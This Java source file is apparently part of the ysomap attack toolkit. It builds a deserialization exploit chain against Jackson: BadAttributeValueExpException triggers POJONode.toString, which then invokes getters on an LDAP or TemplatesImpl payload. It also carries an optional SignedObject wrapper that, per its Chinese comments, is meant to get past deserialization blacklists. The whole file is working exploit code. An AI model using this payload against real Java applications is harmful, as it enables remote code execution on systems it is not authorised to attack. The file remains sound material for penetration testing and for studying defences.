package ysomap.payloads.java.jackson;

import com.fasterxml.jackson.databind.node.POJONode;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import ysomap.bullets.Bullet;
import ysomap.bullets.jdk.LdapAttributeBullet;
import ysomap.common.annotation.*;
import ysomap.core.util.PayloadHelper;
import ysomap.payloads.AbstractPayload;
import javax.management.BadAttributeValueExpException;
import java.io.Serializable;
import java.lang.reflect.Field;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.SignedObject;
import java.util.Objects;


/**
 * @author whocansee
 * @since 2023/10/7
 * BadAttributeValueExpException.readObject->POJONode(BaseJsonNode).toString->bullet对象的getter方法
 * 由于Jackson序列化逻辑中getter调用顺序的问题，在调用到getDatabaseMetaData()之前就会报错，因而不支持JdbcRowSetImplBullet
 * 由于此条链不需要Spring依赖，因而没有引入SpringAOP解决Jackson链的不稳定问题，如果抛出空指针错误多打几次即可
 */
@Payloads
@SuppressWarnings({"rawtypes"})
@Authors({ Authors.whocansee })
@Targets({Targets.JDK})
@Require(bullets = {"LdapAttributeBullet", "TemplatesImplBullet"}, param = false)
@Dependencies({"Jackson all versions."})
@Details("BadAttributeValueExpException.readObject->POJONode(BaseJsonNode).toString->bullet对象的getter方法，"+
        "由于此条链不需要Spring依赖，因而没有引入SpringAOP解决Jackson链的不稳定问题，如果抛出空指针错误多打几次即可")

public class BadAttributeValueExpExceptionWithJackson extends AbstractPayload<Object> {

    @Require(name = "wrapped", detail = "是否使用SignedObject进行二次反序列化（用以绕过反序列化黑名单）" +
            "默认不使用，填true表示启用")
    private Boolean wrapped = false;
    public static int javaassistFlag = 0;
    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return LdapAttributeBullet.newInstance(args);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        if (javaassistFlag == 0){
            CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
            CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
            ctClass.removeMethod(writeReplace);
            ctClass.toClass();
            javaassistFlag = 1;
        }
        Object obj1 = getterGadget(obj);
        if (wrapped) {
            KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
            kpg.initialize(1024);
            KeyPair kp = kpg.generateKeyPair();
            SignedObject signedObject = new SignedObject((Serializable) obj1, kp.getPrivate(), Signature.getInstance("DSA"));
            return PayloadHelper.makeReadObjectToStringTrigger(getterGadget(signedObject));
        } else {
            return PayloadHelper.makeReadObjectToStringTrigger(obj1);
        }
    }
    public static Object getterGadget(Object obj) throws Exception {
        POJONode node = new POJONode(obj);
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(val, node);
        return val;
    }
}